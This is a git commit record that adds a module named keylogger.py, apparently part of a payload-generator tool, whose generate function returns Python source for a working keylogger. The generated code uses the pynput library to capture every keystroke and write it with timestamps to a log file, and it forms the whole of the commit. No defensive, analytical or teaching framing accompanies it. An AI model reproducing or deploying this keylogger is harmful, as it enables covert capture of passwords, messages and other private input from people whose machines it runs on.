0fc51dc8ff91c373d8eac01b5b58e818a7abeb66
Mr.gnosis <teomiro@myyahoo.com>
2025-06-25 22:10:28 +0530

    Create keylogger.py

---
+++ modules/keylogger.py
@@ -0,0 +1,17 @@
+# modules/keylogger.py
+
+def generate(config):
+    return """
+import pynput
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = ""
+logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+"""
